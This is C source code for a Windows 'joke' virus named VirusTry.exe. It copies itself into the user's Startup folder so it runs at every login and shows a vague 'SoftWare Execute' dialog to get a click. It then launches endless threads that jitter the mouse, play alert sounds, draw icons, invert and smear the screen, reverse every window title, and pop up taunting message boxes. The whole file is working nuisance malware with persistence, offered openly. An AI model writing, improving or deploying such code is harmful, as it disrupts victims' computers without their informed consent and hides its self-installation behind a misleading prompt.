#if defined(UNICODE) && !defined(_UNICODE)
    #define _UNICODE
#elif defined(_UNICODE) && !defined(UNICODE)
    #define UNICODE
#endif

#include <pthread.h>
#include <tchar.h>
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#pragma comment(lib, "winmm.lib")


HINSTANCE g_hThisInstance;

// Stores the current location of the running app
WCHAR g_szAppPath[100];

// Stores the startup path of windows
WCHAR g_szStartupPath[100];

// Setting
void Init();
BOOL CopySelf();
BOOL IsInStartupPath();

// Startup
void StartVirus();
void ExecuteFromStartup(LPCWSTR arg);

// Threads
void* Thread_title_change(void* args);
void* Thread_copy_alldesktop(void* args);
void* Thread_copy_somepart(void* args);

int WINAPI WinMain (HINSTANCE hThisInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR lpszArgument,
                     int nCmdShow)
{
    LPWSTR* args = NULL;
    int argc = 0;
    Init();
    BOOL copyf = CopySelf();

    args = CommandLineToArgvW(GetCommandLineW(), &argc);

    if ((argc > 1) && (IsInStartupPath() == TRUE))
    {
        if (lstrcmpW(args[1], L"/main") != 0)
        {
            ExecuteFromStartup(NULL);
            return 0;
        }
        LocalFree(args);
        StartVirus();
    } else if (copyf == TRUE) {
        LocalFree(args);
        pthread_t pht[3];
        PlaySoundA("SystemExclamation", NULL, SND_ASYNC);
        if (MessageBoxA(NULL, "Hi! \nThis is a SoftWare Execute. ", "Startup", MB_OKCANCEL) == IDCANCEL) {
            return 0;
        }
        PlaySoundA("SystemExclamation", NULL, SND_ASYNC);
        if (MessageBoxA(NULL, "We are now prepare to show you some icons on your desktop. \nAre you okay? ", "Get Ready", MB_OKCANCEL) == IDCANCEL) {
            return 0;
        }

        Sleep(20000);
        for (int i = 0; i < 5; i++)
        {
            if (i == 2) {
                pthread_create(&pht[0], NULL, Thread_title_change, NULL);
                pthread_create(&pht[1], NULL, Thread_copy_somepart, NULL);
            }
            ExecuteFromStartup(L"/main");
            Sleep(20000);
        }
        pthread_create(&pht[2], NULL, Thread_copy_alldesktop, NULL);
        pthread_exit(NULL);
        exit(0);
    }

    return -1;
}

void* Thread_play(void* args)
{
    LPCSTR sound;
    while (1) {
        switch (rand() % 5)
        {
        case 0:
            sound = "SystemExclamation";
            break;
        case 1:
            sound = "SystemAsterisk";
            break;
        case 2:
            sound = "SystemQuestion";
            break;
        case 3:
            sound = "SystemHand";
            break;
        case 4:
            sound = "SystemStart";
            break;
        }
        PlaySoundA(sound, NULL, SND_SYNC);
    }
}

void* Thread_show(void* args)
{
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);
    POINT point;
    LPCSTR icon;

    while (1)
    {
        GetCursorPos(&point);
        switch (rand() % 5)
        {
        case 0:
            icon = IDI_WARNING;
            break;
        case 1:
            icon = IDI_ERROR;
            break;
        case 2:
            icon = IDI_QUESTION;
            break;
        case 3:
            icon = IDI_SHIELD;
            break;
        case 4:
            icon = IDI_WINLOGO;
            break;
        }
        DrawIcon(hdc, point.x, point.y, LoadIcon(NULL, icon));
        Sleep(10);
    }
}

void* Thread_color(void* args)
{
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);
    while (1)
    {
        BitBlt(hdc, 0, 0,
               GetSystemMetrics(SM_CXSCREEN),
               GetSystemMetrics(SM_CYSCREEN),
               hdc, 0, 0,
               DSTINVERT
               );
               Sleep(500);
    }
}

void* _Thread_msg(void* args)
{
    MessageBoxW(NULL, L"Did you enjoy it??? ", L"lol", MB_YESNO);
}

void* Thread_msg(void* args)
{
    pthread_t pht;
    while (1)
    {
        Sleep(20000);
        pthread_create(&pht, NULL, _Thread_msg, NULL);
    }
}

void* Thread_mouse_change(void* args)
{
    POINT point;
    int v1, v2, v3;
    while (1)
    {
        GetCursorPos(&point);
        v1 = rand() % 2;
        v2 = rand() % 2;
        v3 = rand() % 2;
        if (v3 == 1) {
            SetCursorPos(point.x+v1, point.y+v2);
        } else if (v3 == 0) {
            SetCursorPos(point.x-v1, point.y-v2);
        }
        Sleep(10);
    }
}

void reverse_string(char* arr)
{
    int len = strlen(arr);
    char tmp = *arr;
    *arr = *(arr + len - 1);
    *(arr + len - 1) = '\0';
    if (strlen(arr + 1) >= 2)
        reverse_string(arr + 1);

    *(arr + len - 1) = tmp;
}

BOOL CALLBACK EnumFunc(HWND hWnd, LPARAM lParam)
{
    char wszTitle[MAX_PATH] = {0};
    GetWindowTextA(hWnd, wszTitle, MAX_PATH);
    reverse_string(wszTitle);
    SetWindowTextA(hWnd, wszTitle);
    return TRUE;
}

void* Thread_title_change(void* args)
{
    HWND Desktop = GetDesktopWindow();
    while (1) {
        EnumChildWindows(Desktop, EnumFunc, 0);
        Sleep(2000);
    }
}

void* Thread_copy_alldesktop(void* args)
{
    while (1)
    {
        HWND hWnd = GetDesktopWindow();
        HDC hdc = GetWindowDC(hWnd);
        struct tagRECT Rect;

        GetWindowRect(hWnd, &Rect);
        StretchBlt(hdc, 50, 50, Rect.right - 100, Rect.bottom - 100, hdc, 0, 0, Rect.right, Rect.bottom, SRCCOPY);
        ReleaseDC(hWnd, hdc);
        Sleep(2000);
    }
}

void* Thread_copy_somepart(void* args)
{
    int x, y;
    int v2, v3, v4, v5, v6, v7, v8, v9;
    HDC v10;
    while (1)
    {
        HWND hWnd = GetDesktopWindow();
        HDC hdc = GetWindowDC(hWnd);
        struct tagRECT Rect;
        GetWindowRect(hWnd, &Rect);
        v2 = rand()%100;
        x = v2 % (Rect.right - 100);
        v3 = rand()%(Rect.right - 100);
        y = v3 % (Rect.bottom - 100);
        v4 = rand()%(Rect.bottom - 100);
        v5 = v4 % (Rect.right - 100);
        v6 = rand()%(Rect.right - 100);
        v7 = v6 % (Rect.bottom - 100);
        v8 = rand()%(Rect.bottom - 100) % 600;
        v9 = rand()%600;
        v10 = hdc;

        BitBlt(hdc, x, y, v8, v9 % 600, hdc, v5, v7, SRCCOPY);
        ReleaseDC(hWnd, v10);
        Sleep(2000);
    }
}

void StartVirus()
{
    pthread_t pht[6];

    pthread_create(&pht[0], NULL, Thread_mouse_change, NULL);
    Sleep(15000);
    pthread_create(&pht[1], NULL, Thread_play, NULL);
    pthread_create(&pht[2], NULL, Thread_show, NULL);
    Sleep(20000);
    pthread_create(&pht[3], NULL, Thread_color, NULL);
    pthread_create(&pht[4], NULL, Thread_msg, NULL);

    pthread_exit(NULL);
}

void ExecuteFromStartup(LPCWSTR arg)
{
    WCHAR szStartup[100];
    lstrcpyW(szStartup, g_szStartupPath);
    lstrcatW(szStartup, L"\\VirusTry.exe");

    ShellExecuteW(NULL, NULL, szStartup, arg, NULL, SW_SHOW);
}

BOOL IsInStartupPath()
{
    WCHAR szStartup[100];
    lstrcpyW(szStartup, g_szStartupPath);
    lstrcatW(szStartup, L"\\VirusTry.exe");

    if (lstrcmpW(szStartup, g_szAppPath) == 0) {
        return TRUE;
    }

    return FALSE;
}

BOOL CopySelf()
{
    WCHAR szDest[100];
    lstrcpyW(szDest, g_szStartupPath);
    lstrcatW(szDest, L"\\VirusTry.exe");

    if (CopyFileW(g_szAppPath, szDest, FALSE))
    {
        return TRUE;
    }
    return FALSE;
}

void Init()
{
    GetModuleFileNameW(g_hThisInstance, g_szAppPath, 100);
    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, NULL, g_szStartupPath);
}

